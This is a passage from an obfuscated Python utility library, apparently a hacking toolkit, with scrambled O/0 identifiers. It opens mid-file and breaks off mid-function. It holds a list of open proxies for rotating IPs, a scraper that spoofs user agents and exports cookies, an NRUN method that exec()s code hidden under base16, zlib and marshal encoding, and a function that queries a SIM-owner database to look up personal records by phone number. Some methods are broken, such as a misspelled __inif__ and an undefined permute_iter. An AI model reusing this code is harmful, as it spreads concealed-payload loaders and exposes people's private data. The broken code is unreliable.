    O0OOOO0OO0O00O0O0 .proxylist =[{'https':'199.195.248.24:8080'},{'https':'103.86.187.242:23500'},{'https':'103.149.9.2:8080'},{'https':'138.197.102.119:80'},{'https':'13.92.6.80:3128'},{'https':'45.63.14.189:8080'},{'https':'67.205.151.68:8080'},{'https':'149.28.235.52:8080'},{'https':'198.50.177.44:44699'},{'https':'161.35.112.151:3128'},{'https':'45.77.76.254:8080'},{'https':'137.220.52.72:8080'},{'https':'149.28.50.175:8080'},{'https':'165.225.38.32:10605'},{'https':'8.9.31.198:8080'},{'https':'52.179.231.206:80'},{'https':'45.77.151.131:8080'},{'https':'147.75.51.179:3128'},{'https':'167.99.181.81:3128'},{'https':'155.138.150.235:8080'},{'https':'162.243.210.52:6411'},{'https':'104.251.210.103:3128'},{'https':'144.121.255.37:8080'},{'https':'149.56.1.48:8181'},{'https':'71.174.241.163:3128'},{'https':'148.153.11.58:39593'},{'https':'134.122.26.80:3128'},{'https':'167.99.177.76:8080'},{'https':'3.19.238.16:3128'},{'https':'168.169.96.14:8080'},{'https':'207.237.148.14:38694'},{'https':'64.235.204.107:8080'},{'https':'155.138.142.213:8080'}]#line:1023
  def getproxy (OOO000OOO00O000OO ):#line:1025
    return choice (OOO000OOO00O000OO .proxylist )#line:1026
class WEB :#line:1031
  def __init__ (OOO00OOO00O00OO00 ):#line:1032
    OOO00OOO00O00OO00 .url =''#line:1033
    OOO00OOO00O00OO00 .html =''#line:1034
    OOO00OOO00O00OO00 .s =Session ()#line:1035
    OOO00OOO00O00OO00 .agent ={"Accept-Language":"en-US,en;q=0.5","user-agent":Faker ().user_agent ()}#line:1039
    OOO00OOO00O00OO00 .s .headers .update (OOO00OOO00O00OO00 .agent )#line:1040
    OOO00OOO00O00OO00 .data ={}#line:1041
    OOO00OOO00O00OO00 .content =''#line:1042
  def showhtml (OOO000OO0O000O0OO ):#line:1044
    return OOO000OO0O000O0OO .html #line:1045
  def seturl (OO0O0OOO0O000OOOO ,O00O00000OO00O00O ):#line:1047
    OO0O0OOO0O000OOOO .url =O00O00000OO00O00O #line:1048
    return O00O00000OO00O00O #line:1049
  def writehtml (OOO0O0O0O0O0O0O00 ,O0OO000000OO0OO00 ):#line:1051
   with open (O0OO000000OO0OO00 ,'w')as O0O0OOO0O00O0OOOO :#line:1052
     print ('{} bytes written ..'.format (O0O0OOO0O00O0OOOO .write (OOO0O0O0O0O0O0O00 .content )))#line:1053
  def getcookie (O0OO0O0O0O00O000O ):#line:1055
    try :#line:1056
      return O0OO0O0O0O00O000O .s .cookies .get_dict ()#line:1057
    except :pass #line:1058
  def setcookie (O0O0OOOO00O0OO0OO ,O0OO00O0OO0O0O0OO ):#line:1060
    with open (O0OO00O0OO0O0O0OO ,'r')as OO000OO0O00OO0000 :#line:1061
      try :O0O0OOOO00O0OO0OO .s .cookies .update (json .loads (OO000OO0O00OO0000 .read ()))#line:1062
      except :pass #line:1063
  def getkey (OOOOO0O0O0OO0OOOO ):#line:1065
   try :#line:1066
    OO0O00O0O0OO0O00O =json .dumps (OOOOO0O0O0OO0OOOO .s .cookies .get_dict ())#line:1067
    return base64 .b16encode (OO0O00O0O0OO0O00O .encode ('utf-8'))#line:1068
   except :pass #line:1069
  def setkey (O0O0O0O00OO0O000O ,OOOOO0O0O0O000000 ):#line:1071
   try :#line:1072
    O0OO00O00O0O000O0 =json .loads (base64 .b16decode (OOOOO0O0O0O000000 .encode ('utf-8')))#line:1073
    O0O0O0O00OO0O000O .s .cookies .update (O0OO00O00O0O000O0 )#line:1074
   except :pass #line:1075
  def setuseragent (O0000OO000OOOOO00 ,O000OO0O0OO0O0000 ):#line:1077
     try :O0000OO000OOOOO00 .s .headers .update (O000OO0O0OO0O0000 )#line:1078
     except :pass #line:1079
  def savecookie (OOO00O0OOO00OOOO0 ,O0OOOO00O00O0O00O ):#line:1081
    try :#line:1082
      with open (O0OOOO00O00O0O00O ,'w')as O0000O0OOOOO0O0OO :#line:1083
        O0000O0OOOOO0O0OO .write (json .dumps (OOO00O0OOO00OOOO0 .cookie .get_dict ()))#line:1084
    except :pass #line:1085
  def setproxy (O0OO0O0O0OO000O0O ,OOO00OO00O0OOOOO0 ):#line:1087
    try :O0OO0O0O0OO000O0O .s .proxies =OOO00OO00O0OOOOO0 #line:1088
    except :pass #line:1089
  def fetch (OO0OO00OOO0OOO0OO ,O0O0OOO00O00O0000 ,O0O0O0O0OO00O00O0 ):#line:1091
    if O0O0OOO00O00O0000 .upper ()=='GET':#line:1092
     try :#line:1093
      OO0O0OO0000000O00 =OO0OO00OOO0OOO0OO .s .get (OO0OO00OOO0OOO0OO .url )#line:1094
      OO0OO00OOO0OOO0OO .content =OO0O0OO0000000O00 .text #line:1095
      OO0OO00OOO0OOO0OO .html =bs (OO0O0OO0000000O00 .content ,'html.parser')#line:1096
      return OO0O0OO0000000O00 #line:1097
     except :pass #line:1098
    elif O0O0OOO00O00O0000 .upper ()=='POST':#line:1099
     try :#line:1100
      OO0O0OO0000000O00 =OO0OO00OOO0OOO0OO .s .post (OO0OO00OOO0OOO0OO .url ,O0O0O0O0OO00O00O0 )#line:1101
      OO0OO00OOO0OOO0OO .content =OO0O0OO0000000O00 .text #line:1102
      OO0OO00OOO0OOO0OO .html =bs (OO0O0OO0000000O00 .content ,'html.parser')#line:1103
      return OO0O0OO0000000O00 #line:1104
     except :pass #line:1105
  def getform (O0OOOO0O00O00O00O ,OO0000OOO00OOOOOO ):#line:1107
    OOO0OO00O00OOO00O ={}#line:1108
    O0O0OOOOOOOOO0O0O =O0OOOO0O00O00O00O .html .find_all ('form')[OO0000OOO00OOOOOO ]#line:1109
    for O0000O0OO000O0000 in O0O0OOOOOOOOO0O0O .find_all ('input'):#line:1110
       try :OOO0OO00O00OOO00O [O0000O0OO000O0000 ['name']]=O0000O0OO000O0000 ['value']#line:1111
       except :pass #line:1112
    try :OOO0OO00O00OOO00O ['action']=O0O0OOOOOOOOO0O0O ['action']#line:1114
    except :pass #line:1115
    return OOO0OO00O00OOO00O #line:1116
  def getinput (O00O0OOOO00OOOOO0 ,OO000000O0000O0O0 ):#line:1118
   O0OOOOOO0000OOO00 ={}#line:1119
   OOO0000OO0O0OOOOO =O00O0OOOO00OOOOO0 .html .find_all ('form')[OO000000O0000O0O0 ]#line:1120
   for OOO000OOO000O00O0 in OOO0000OO0O0OOOOO .find_all ('input'):#line:1121
     try :#line:1122
       O0OOOOOO0000OOO00 [OOO000OOO000O00O0 ['name']]=''#line:1123
       try :O0OOOOOO0000OOO00 [OOO000OOO000O00O0 ['name']]=OOO000OOO000O00O0 ['value']#line:1124
       except :pass #line:1125
     except :pass #line:1126
   return O0OOOOOO0000OOO00 #line:1127
  def html2text (O00OOOOO0OOO00O00 ):#line:1129
    return O00OOOOO0OOO00O00 .html .get_text ()#line:1130
  def getlinks (OOO0OOO00O0OOOOOO ):#line:1132
    OO00O0OO0000O0000 =[]#line:1133
    OOOOOO00000OO0OO0 =OOO0OOO00O0OOOOOO .html .find_all ('a')#line:1134
    for O0OOO0O00O0O0000O in OOOOOO00000OO0OO0 :#line:1135
      try :#line:1136
        if O0OOO0O00O0O0000O ['href']:#line:1137
          OO00O0OO0000O0000 .append (O0OOO0O00O0O0000O ['href'])#line:1138
      except :pass #line:1139
    return OO00O0OO0000O0000 #line:1140
class COLOR :#line:1144
  def __init__ (OOOO0OOOOO0O000O0 ):#line:1145
    OOOO0OOOOO0O000O0 .W ='\033[1;37m'#line:1147
    OOOO0OOOOO0O000O0 .N ='\033[0m'#line:1148
    OOOO0OOOOO0O000O0 .R ="\033[1;37m\033[31m"#line:1149
    OOOO0OOOOO0O000O0 .B ='\033[1;37m\033[34m'#line:1150
    OOOO0OOOOO0O000O0 .G ='\033[1;32m'#line:1151
    OOOO0OOOOO0O000O0 .Y ='\033[1;33;40m'#line:1152
    OOOO0OOOOO0O000O0 .SRO =OOOO0OOOOO0O000O0 .W +"("+OOOO0OOOOO0O000O0 .R +">"+OOOO0OOOOO0O000O0 .W +")"#line:1154
    OOOO0OOOOO0O000O0 .SGO =OOOO0OOOOO0O000O0 .W +"("+OOOO0OOOOO0O000O0 .G +">"+OOOO0OOOOO0O000O0 .W +")"#line:1155
    OOOO0OOOOO0O000O0 .SBG ='\x1b[1;37m(\x1b[1;32m\xe2\x97\x8f\x1b[1;37m)'#line:1156
    OOOO0OOOOO0O000O0 .SBR ='\x1b[1;37m(\x1b[1;37m\x1b[31m\xe2\x97\x8f\x1b[1;37m)'#line:1157
  def red (O00O00O0O0OOOO0O0 ):return O00O00O0O0OOOO0O0 .R #line:1159
  def neon (O0000O00000OOO00O ):return O0000O00000OOO00O .N #line:1160
  def blue (OO0O000O000OOOO0O ):return OO0O000O000OOOO0O .B #line:1161
  def yellow (OO000OO00OOO0O000 ):return OO000OO00OOO0O000 .Y #line:1162
  def green (OOO0O0O00OOOO0OOO ):return OOO0O0O00OOOO0OOO .G #line:1163
  def white (OOOO0O0O00O00O000 ):return OOOO0O0O00O00O000 .W #line:1164
  def greentick (OOOOOO0OOOO000OOO ):return OOOOOO0OOOO000OOO .SGO #line:1166
  def redtick (O0OO0O00O0000OO0O ):return O0OO0O00O0000OO0O .SRO #line:1167
  def greendot (OOO0OO000O0OO0000 ):return OOO0OO000O0OO0000 .SBG #line:1169
  def reddot (O00OOO0OOOOOOOOO0 ):return O00OOO0OOOOOOOOO0 .SBR #line:1170
class HACK :#line:1175
  def __init__ (O0000000OOOO0OO0O ):#line:1176
     import zlib #line:1177
     import marshal #line:1178
     O0000000OOOO0OO0O .zlib =zlib #line:1179
     O0000000OOOO0OO0O .marshal =marshal #line:1180
  def getip (OO0OO000OO00O000O ,OO00OOOO0O00O000O ):#line:1182
   O00OOO0OOOOOOOO00 =get ("http://api.hostip.info/get_html.php?ip={}&position=true".format (OO00OOOO0O00O000O ))#line:1183
   print ('----'*10 +'\n')#line:1184
   print (O00OOO0OOOOOOOO00 .text )#line:1185
   print ('----'*10 )#line:1186
  def encrypt (OOO0O0OOOOOOOO0OO ,OOOOOO0O0O00OO00O ):#line:1188
      OOO0O0OO0OO0OO00O =''#line:1189
      for OOOO00000O00OO0OO in OOOOOO0O0O00OO00O :#line:1190
        OOO0O0OO0OO0OO00O =OOO0O0OO0OO0OO00O +chr (ord (OOOO00000O00OO0OO )+2 )#line:1191
      return OOO0O0OO0OO0OO00O #line:1192
  def decrypt (OO000O0O0OO0O0OOO ,OO00OO00OO0O0O000 ):#line:1194
      O00OO0OOOO0O000O0 =''#line:1195
      for O0000OOO0O000OO00 in OO00OO00OO0O0O000 :#line:1196
        O00OO0OOOO0O000O0 =O00OO0OOOO0O000O0 +chr (ord (O0000OOO0O000OO00 )-2 )#line:1197
      return O00OO0OOOO0O000O0 #line:1198
  def NENC (O00000OO00O0OO000 ,OOO0OO0OO0OO0O0OO ):#line:1201
   O0OOO000O0OO0OOO0 =base64 .b16encode (OOO0OO0OO0OO0O0OO .encode ('utf-8'))#line:1202
   return O00000OO00O0OO000 .marshal .dumps (O00000OO00O0OO000 .zlib .compress (O0OOO000O0OO0OOO0 ))#line:1203
  def NRUN (OO00OO0OO0OO0O0OO ,O0O0O0OO0O0O00OOO ):#line:1206
    exec (base64 .b16decode (OO00OO0OO0OO0O0OO .zlib .decompress (OO00OO0OO0OO0O0OO .marshal .loads (O0O0O0OO0O0O00OOO ))))#line:1207
  def phonenumdata (OO0OOOO0O00OO0O00 ,OO0OO0O00OOOOOO00 ):#line:1210
    try :#line:1211
      if len (OO0OO0O00OOOOOO00 )==11 :#line:1212
             OO0OO0O00OOOOOO00 =OO0OO0O00OOOOOO00 [1 :]#line:1213
      elif len (OO0OO0O00OOOOOO00 )==13 :#line:1214
        if '+92'in OO0OO0O00OOOOOO00 :#line:1215
          OO0OO0O00OOOOOO00 =OO0OO0O00OOOOOO00 [3 :]#line:1216
      elif len (OO0OO0O00OOOOOO00 )==12 :#line:1217
        if '92'in OO0OO0O00OOOOOO00 :#line:1218
          OO0OO0O00OOOOOO00 =OO0OO0O00OOOOOO00 [2 :]#line:1219
      OOO000OO00OOOOO0O ={'cnnum':str (OO0OO0O00OOOOOO00 )}#line:1220
      O0O0OOO00O000OOO0 =Session ().post ('https://simdatabaseonline.com/tele/search-result.php',OOO000OO00OOOOO0O )#line:1221
      O0O0000O00OO00000 =bs (O0O0OOO00O000OOO0 .content ,'html.parser')#line:1222
      O0O0O0OOOO0OO0OOO =O0O0000O00OO00000 .find ('div',attrs ={'role':'alert'})#line:1223
      O00O0OO00OO0OO000 =O0O0O0OOOO0OO0OOO .find ('table')#line:1224
      O000O00OO0OO00O0O ={}#line:1225
      for O0000OOOO0O0000OO in O00O0OO00OO0OO000 .findAll ('tr'):#line:1226
         OO000OOO0O0OOOO00 =O0000OOOO0O0000OO .findAll ('td')#line:1227
         O000O00OO0OO00O0O [OO000OOO0O0OOOO00 [0 ].string ]=OO000OOO0O0OOOO00 [1 ].string #line:1228
      OO0O00O0O00O0O000 =""#line:1229
      for O00O0OO000O0OOO0O in O000O00OO0OO00O0O .keys ():#line:1230
         OO0O00O0O00O0O000 +=O00O0OO000O0OOO0O .upper ()+' : '+O000O00OO0OO00O0O .get (O00O0OO000O0OOO0O ).upper ()+'\n'#line:1231
      return OO0O00O0O00O0O000 #line:1232
    except :#line:1233
         return 'Not Found !'#line:1234
class TEXT :#line:1237
  def __init__ (OO0OOO0O0OOOOOOO0 ):#line:1238
    import pyfiglet #line:1239
    OO0OOO0O0OOOOOOO0 .letters =list ('abcdefghijklmnopqrstuvwxyz')#line:1240
    OO0OOO0O0OOOOOOO0 .pyfiglet =pyfiglet #line:1241
    OO0OOO0O0OOOOOOO0 .font ='standard'#line:1242
  def textart (OO0OOO0OOO0O0OO00 ,O0O000OO000O000OO ):#line:1244
    return OO0OOO0OOO0O0OO00 .pyfiglet .figlet_format (O0O000OO000O000OO ,font =OO0OOO0OOO0O0OO00 .font )#line:1245
  def textartfont (OOO0O0000000O0OOO ,O000OOO0O0O00OOO0 ):#line:1247
    OOO0O0000000O0OOO .font =O000OOO0O0O00OOO0 #line:1248
    return O000OOO0O0O00OOO0 #line:1249
  def revtext (OO0OO0OOOOOOOOOO0 ,OO0OOO000000O00O0 ):#line:1252
   return OO0OOO000000O00O0 [::-1 ]#line:1253
  def letterscount (O0O0O00OO0OOO0O00 ,O00OO0OO00OOOO0OO ):#line:1256
    OO00O000O0OOO0O00 ={}#line:1257
    for O00OO0OOOO00OO00O in O0O0O00OO0OOO0O00 .letters :#line:1258
      OO00O000O0OOO0O00 [O00OO0OOOO00OO00O ]=O00OO0OO00OOOO0OO .lower ().count (O00OO0OOOO00OO00O )#line:1259
    return OO00O000O0OOO0O00 #line:1260
  def revarray (O0OO00OO00O000000 ,OO000O0O0OO00000O ):#line:1263
    return OO000O0O0OO00000O [::-1 ]#line:1264
  def remove_duplicates (O0OO0OO000O0OO00O ,OOOOO00OO0OO000OO ):#line:1266
      ""#line:1270
      return " ".join (sorted (set (OOOOO00OO0OO000OO .split (" "))))#line:1271
  def naive_pattern_search (O0000O000OOOO0O0O ,OOO0O00000OOOOO00 ,OOO00000O0O0OO0O0 ):#line:1273
      ""#line:1285
      O0000OO0OOOO0OOOO =len (OOO00000O0O0OO0O0 )#line:1286
      OO0OO0O00OO0OOOOO =[]#line:1287
      for O0O0O0OO000OOO0O0 in range (len (OOO0O00000OOOOO00 )-O0000OO0OOOO0OOOO +1 ):#line:1288
          OO0OOOOOOO000O0OO =True #line:1289
          for O0OO000OOO00OO00O in range (O0000OO0OOOO0OOOO ):#line:1290
              if OOO0O00000OOOOO00 [O0O0O0OO000OOO0O0 +O0OO000OOO00OO00O ]!=OOO00000O0O0OO0O0 [O0OO000OOO00OO00O ]:#line:1291
                  OO0OOOOOOO000O0OO =False #line:1292
                  break #line:1293
          if OO0OOOOOOO000O0OO :#line:1294
              OO0OO0O00OO0OOOOO .append (O0O0O0OO000OOO0O0 )#line:1295
      return OO0OO0O00OO0OOOOO #line:1296
  def bsearch (OOO0OO0OOOO0000OO ,_O000O0000OO0000O0 ,OOOO0OOOOOOOOO000 ):#line:1300
   if type (_O000O0000OO0000O0 )is not list :#line:1301
      raise TypeError ("binary search only excepts lists, not {}".format (str (type (_O000O0000OO0000O0 ))))#line:1302
   O0O0O000O0O00O000 =0 #line:1305
   OOOO0O00OOO0O0OO0 =len (_O000O0000OO0000O0 )-1 #line:1307
   try :#line:1309
      while O0O0O000O0O00O000 <=OOOO0O00OOO0O0OO0 :#line:1311
          O00O0000OO0O000OO =(O0O0O000O0O00O000 +OOOO0O00OOO0O0OO0 )//2 #line:1312
          if OOOO0OOOOOOOOO000 ==_O000O0000OO0000O0 [O00O0000OO0O000OO ]:#line:1313
              return O00O0000OO0O000OO #line:1314
          elif OOOO0OOOOOOOOO000 <_O000O0000OO0000O0 [O00O0000OO0O000OO ]:#line:1315
              OOOO0O00OOO0O0OO0 =O00O0000OO0O000OO -1 #line:1316
          else :#line:1317
              O0O0O000O0O00O000 =O00O0000OO0O000OO +1 #line:1318
      return False #line:1319
   except TypeError :#line:1320
      return False #line:1321
  def revowel (OO0OOO0O0O0O0000O ,OOO00O0O0O0OO00O0 ):#line:1323
      OOO00OO000O00OOOO ="AEIOUaeiou"#line:1324
      OOO0OOOOOO0O0O0OO ,OO0000000000O0O00 =0 ,len (OOO00O0O0O0OO00O0 )-1 #line:1325
      OOO00O0O0O0OO00O0 =list (OOO00O0O0O0OO00O0 )#line:1326
      while OOO0OOOOOO0O0O0OO <OO0000000000O0O00 :#line:1327
          while OOO0OOOOOO0O0O0OO <OO0000000000O0O00 and OOO00O0O0O0OO00O0 [OOO0OOOOOO0O0O0OO ]not in OOO00OO000O00OOOO :#line:1328
              OOO0OOOOOO0O0O0OO +=1 #line:1329
          while OOO0OOOOOO0O0O0OO <OO0000000000O0O00 and OOO00O0O0O0OO00O0 [OO0000000000O0O00 ]not in OOO00OO000O00OOOO :#line:1330
              OO0000000000O0O00 -=1 #line:1331
          OOO00O0O0O0OO00O0 [OOO0OOOOOO0O0O0OO ],OOO00O0O0O0OO00O0 [OO0000000000O0O00 ]=OOO00O0O0O0OO00O0 [OO0000000000O0O00 ],OOO00O0O0O0OO00O0 [OOO0OOOOOO0O0O0OO ]#line:1332
          OOO0OOOOOO0O0O0OO ,OO0000000000O0O00 =OOO0OOOOOO0O0O0OO +1 ,OO0000000000O0O00 -1 #line:1333
      return "".join (OOO00O0O0O0OO00O0 )#line:1334
  def samewords (OO0O0OO00OO000OO0 ,O0OO00O0O0OO0O000 ):#line:1336
      ""#line:1340
      OO0O0O00000OO000O ={}#line:1341
      OO00O00O0O0OO0OO0 =[]#line:1342
      OOO00OOOO00OOO000 =0 #line:1343
      for OOO00O0O0OOO00000 in O0OO00O0O0OO0O000 :#line:1344
          OOO0O0O0O000OO0O0 =''.join (sorted (OOO00O0O0OOO00000 ))#line:1345
          if OOO0O0O0O000OO0O0 not in OO0O0O00000OO000O :#line:1346
              OO0O0O00000OO000O [OOO0O0O0O000OO0O0 ]=OOO00OOOO00OOO000 #line:1347
              OOO00OOOO00OOO000 +=1 #line:1348
              OO00O00O0O0OO0OO0 .append ([])#line:1349
              OO00O00O0O0OO0OO0 [-1 ].append (OOO00O0O0OOO00000 )#line:1350
          else :#line:1351
              OO00O00O0O0OO0OO0 [OO0O0O00000OO000O [OOO0O0O0O000OO0O0 ]].append (OOO00O0O0OOO00000 )#line:1352
      return OO00O00O0O0OO0OO0 #line:1353
  def dprint (OO0OOO0OOOOO00O00 ,OOO0O0OO0OO0OO000 ):#line:1356
      for O00O00O00OO000OOO in OOO0O0OO0OO0OO000 .keys ():#line:1357
       try :#line:1358
          print ("{} : {}".format (O00O00O00OO000OOO ,OOO0O0OO0OO0OO000 [O00O00O00OO000OOO ]))#line:1359
       except :#line:1360
          pass #line:1361
  def spattern (OOOO00OOO0O00O0OO ,OO0O0OO00O0000O00 ,O0O0O000OOOO0O00O ):#line:1363
      ""#line:1368
      def OOOO00OOOOOO0O00O (O0OO0OO0O0000OOOO ,OO0OOO0O00OO0OO00 ,O0O0OOOO0O0000O0O ):#line:1369
          if len (O0OO0OO0O0000OOOO )==0 and len (OO0OOO0O00OO0OO00 )>0 :#line:1371
              return False #line:1372
          if len (O0OO0OO0O0000OOOO )==len (OO0OOO0O00OO0OO00 )==0 :#line:1374
              return True #line:1375
          for OOOOOO00OO00O00O0 in range (1 ,len (OO0OOO0O00OO0OO00 )-len (O0OO0OO0O0000OOOO )+2 ):#line:1377
              if O0OO0OO0O0000OOOO [0 ]not in O0O0OOOO0O0000O0O and OO0OOO0O00OO0OO00 [:OOOOOO00OO00O00O0 ]not in O0O0OOOO0O0000O0O .values ():#line:1378
                  O0O0OOOO0O0000O0O [O0OO0OO0O0000OOOO [0 ]]=OO0OOO0O00OO0OO00 [:OOOOOO00OO00O00O0 ]#line:1379
                  if OOOO00OOOOOO0O00O (O0OO0OO0O0000OOOO [1 :],OO0OOO0O00OO0OO00 [OOOOOO00OO00O00O0 :],O0O0OOOO0O0000O0O ):#line:1380
                      return True #line:1381
                  del O0O0OOOO0O0000O0O [O0OO0OO0O0000OOOO [0 ]]#line:1382
              elif O0OO0OO0O0000OOOO [0 ]in O0O0OOOO0O0000O0O and O0O0OOOO0O0000O0O [O0OO0OO0O0000OOOO [0 ]]==OO0OOO0O00OO0OO00 [:OOOOOO00OO00O00O0 ]:#line:1383
                  if OOOO00OOOOOO0O00O (O0OO0OO0O0000OOOO [1 :],OO0OOO0O00OO0OO00 [OOOOOO00OO00O00O0 :],O0O0OOOO0O0000O0O ):#line:1384
                      return True #line:1385
          return False #line:1386
      return OOOO00OOOOOO0O00O (OO0O0OO00O0000O00 ,O0O0O000OOOO0O00O ,{})#line:1388
  def permute (OOOOO0OOOOOOO000O ,O000000000O000O00 ):#line:1391
      ""#line:1394
      if len (O000000000O000O00 )<=1 :#line:1395
          yield O000000000O000O00 #line:1396
      else :#line:1397
          for OOOO000O0O00OOOO0 in permute_iter (O000000000O000O00 [1 :]):#line:1398
              for OOOOO0OOOOO0OO00O in range (len (O000000000O000O00 )):#line:1399
                  yield OOOO000O0O00OOOO0 [:OOOOO0OOOOO0OO00O ]+O000000000O000O00 [0 :1 ]+OOOO000O0O00OOOO0 [OOOOO0OOOOO0OO00O :]#line:1400
  def upermute (OOOO00O0OO0O0O0OO ,OO00OO0O0O0O0OOO0 ):#line:1402
      O0O00OO0O000OOOOO =[[]]#line:1403
      for OO0O00O0O00000OOO in OO00OO0O0O0O0OOO0 :#line:1404
          O00OO0OO00OOOO000 =[]#line:1405
          for OO000OO0OOOOOO0OO in O0O00OO0O000OOOOO :#line:1406
              for OOO0O000OO00OOOOO in range (len (OO000OO0OOOOOO0OO )+1 ):#line:1407
                  O00OO0OO00OOOO000 .append (OO000OO0OOOOOO0OO [:OOO0O000OO00OOOOO ]+[OO0O00O0O00000OOO ]+OO000OO0OOOOOO0OO [OOO0O000OO00OOOOO :])#line:1408
                  if OOO0O000OO00OOOOO <len (OO000OO0OOOOOO0OO )and OO000OO0OOOOOO0OO [OOO0O000OO00OOOOO ]==OO0O00O0O00000OOO :#line:1409
                      break #line:1410
          O0O00OO0O000OOOOO =O00OO0OO00OOOO000 #line:1411
      return O0O00OO0O000OOOOO #line:1412
  def genabbrev (O0OO00O0OO000O00O ,O0OOO0O0O0OOO00O0 ):#line:1416
      def O0O0000OO000OOO0O (OOOO00000O0O00000 ,O0O000OO0O000OOO0 ,O0O0O0O00O000000O ,OOO0OO00OOO00O0O0 ,O000O0OOOOOOOOO00 ):#line:1417
          if O0O0O0O00O000000O ==len (O0O000OO0O000OOO0 ):#line:1418
              if OOO0OO00OOO00O0O0 >0 :#line:1419
                  O000O0OOOOOOOOO00 +=str (OOO0OO00OOO00O0O0 )#line:1420
              OOOO00000O0O00000 .append (O000O0OOOOOOOOO00 )#line:1421
              return #line:1422
          if OOO0OO00OOO00O0O0 >0 :#line:1423
              O0O0000OO000OOO0O (OOOO00000O0O00000 ,O0O000OO0O000OOO0 ,O0O0O0O00O000000O +1 ,0 ,O000O0OOOOOOOOO00 +str (OOO0OO00OOO00O0O0 )+O0O000OO0O000OOO0 [O0O0O0O00O000000O ])#line:1424
          else :#line:1425
              O0O0000OO000OOO0O (OOOO00000O0O00000 ,O0O000OO0O000OOO0 ,O0O0O0O00O000000O +1 ,0 ,O000O0OOOOOOOOO00 +O0O000OO0O000OOO0 [O0O0O0O00O000000O ])#line:1426
          O0O0000OO000OOO0O (OOOO00000O0O00000 ,O0O000OO0O000OOO0 ,O0O0O0O00O000000O +1 ,OOO0OO00OOO00O0O0 +1 ,O000O0OOOOOOOOO00 )#line:1428
      OOOOOOO0OOOO0OOOO =[]#line:1429
      O0O0000OO000OOO0O (OOOOOOO0OOOO0OOOO ,O0OOO0O0O0OOO00O0 ,0 ,0 ,"")#line:1430
      return OOOOOOO0OOOO0OOOO #line:1431
  def lettercombin (OO0OOOO0OOO00O00O ,O00OO0O0O00OOOOO0 ):#line:1434
      if O00OO0O0O00OOOOO0 =="":#line:1435
          return []#line:1436
      OO0O00000OOO000O0 ={"2":"abc","3":"def","4":"ghi","5":"jkl","6":"mno","7":"pqrs","8":"tuv","9":"wxyz"}#line:1446
      O0OOO0OO0O0O0OO00 =[""]#line:1447
      for O00OO0O000O0OOO00 in O00OO0O0O00OOOOO0 :#line:1448
          O0000O0OOO0O000O0 =[]#line:1449
          for OOO0OOO0OO00O00O0 in O0OOO0OO0O0O0OO00 :#line:1450
              for O0OO0OO0000O0OOOO in OO0O00000OOO000O0 [O00OO0O000O0OOO00 ]:#line:1451
                  O0000O0OOO0O000O0 .append (OOO0OOO0OO00O00O0 +O0OO0OO0000O0OOOO )#line:1452
          O0OOO0OO0O0O0OO00 =O0000O0OOO0O000O0 #line:1453
      return O0OOO0OO0O0O0OO00 #line:1454
class CONVERTER :#line:1458
  def __inif__ (O00OOO00O0O000OOO ):#line:1459
     O00OOO00O0O000OOO .a =a #line:1460
  def dec2bin (OO00O000O0O0O0O0O ,OO00OOOOOO0000O00 ):#line:1462
       ""#line:1474
       if isinstance (OO00OOOOOO0000O00 ,str ):#line:1475
           OO00OOOOOO0000O00 =int (OO00OOOOOO0000O00 )#line:1476
       O0OO0000OO0O00000 =[]#line:1477
       while OO00OOOOOO0000O00 >=1 :#line:1478
           O00OO00O0OOO0O000 =OO00OOOOOO0000O00 %2 #line:1479
           O0OO0000OO0O00000 .append (O00OO00O0OOO0O000 )#line:1480
           OO00OOOOOO0000O00 =OO00OOOOOO0000O00 //2 #line:1481
       return ''.join (map (str ,O0OO0000OO0O00000 [::-1 ]))#line:1483
  def bin2dec (O00OOO00O00000OO0 ,OO0OOO0O0O00OO0O0 ):#line:1486
      ""#line:1498
      OO000000OO000OO00 =[]#line:1499
      OO0OOO0O0O00OO0O0 =list (str (OO0OOO0O0O00OO0O0 )[::-1 ])#line:1500
      for O0OOOOO0O0000O0O0 in range (len (OO0OOO0O0O00OO0O0 )):#line:1501
          OO000000OO000OO00 .append (int (OO0OOO0O0O00OO0O0 [O0OOOOO0O0000O0O0 ])*(2 **O0OOOOO0O0000O0O0 ))#line:1502
      return sum (OO000000OO000OO00 )#line:1504
  def dec2hex (OO00O0O00000O0O0O ,O0OO0O0O0O0OO0O0O ):#line:1507
      ""#line:1519
      if isinstance (O0OO0O0O0O0OO0O0O ,str ):#line:1520
          O0OO0O0O0O0OO0O0O =int (O0OO0O0O0O0OO0O0O )#line:1521
      OOOOO0OO0OO0OO00O =[]#line:1522
      OO00000OO0O0000OO ={10 :'A',11 :'B',12 :'C',13 :'D',14 :'E',15 :'F'}#line:1523
      while O0OO0O0O0O0OO0O0O >=1 :#line:1524
          OO0O0O00O00OOOOO0 =O0OO0O0O0O0OO0O0O %16 #line:1525
          if OO0O0O00O00OOOOO0 <10 :#line:1526
              OOOOO0OO0OO0OO00O .append (OO0O0O00O00OOOOO0 )#line:1527
          elif OO0O0O00O00OOOOO0 >=10 :#line:1528
              OOOOO0OO0OO0OO00O .append (OO00000OO0O0000OO [OO0O0O00O00OOOOO0 ])#line:1529
          O0OO0O0O0O0OO0O0O =O0OO0O0O0O0OO0O0O //16 #line:1531
      return ''.join (map (str ,OOOOO0OO0OO0OO00O [::-1 ]))#line:1533
  def hex2dec (O000OOO00000OOOO0 ,O0OOOO00O0OO000OO ):#line:1536
      ""#line:1548
      O0OOO00O00OOO00OO =[]#line:1549
      OO0OO000O00OOO000 ={'A':10 ,'B':11 ,'C':12 ,'D':13 ,'E':14 ,'F':15 }#line:1550
      O0OOOO00O0OO000OO =list (str (O0OOOO00O0OO000OO )[::-1 ])#line:1551
      for O0OO0OOO0OOO0OO00 in range (len (O0OOOO00O0OO000OO )):#line:1552
          try :#line:1553
              if int (O0OOOO00O0OO000OO [O0OO0OOO0OOO0OO00 ])<10 :#line:1554
                  O0OOO00O00OOO00OO .append (int (O0OOOO00O0OO000OO [O0OO0OOO0OOO0OO00 ])*(16 **O0OO0OOO0OOO0OO00 ))#line:1555
          except ValueError :#line:1556
              O0OOO00O00OOO00OO .append (OO0OO000O00OOO000 [O0OOOO00O0OO000OO [O0OO0OOO0OOO0OO00 ]]*(16 **O0OO0OOO0OOO0OO00 ))#line:1557
      return sum (O0OOO00O00OOO00OO )#line:1559
  def roman2int (OOOO00OO000O00OO0 ,O000O0000OO00O00O ):#line:1563
      O00OOOOO0O0OO00OO =0 #line:1564
      OOOOO00OO0O00OO0O ={'M':1000 ,'D':500 ,'C':100 ,'L':50 ,'X':10 ,'V':5 ,'I':1 }#line:1565
      for O0O0000OO0OO0OO0O in range (len (O000O0000OO00O00O )-1 ):#line:1566
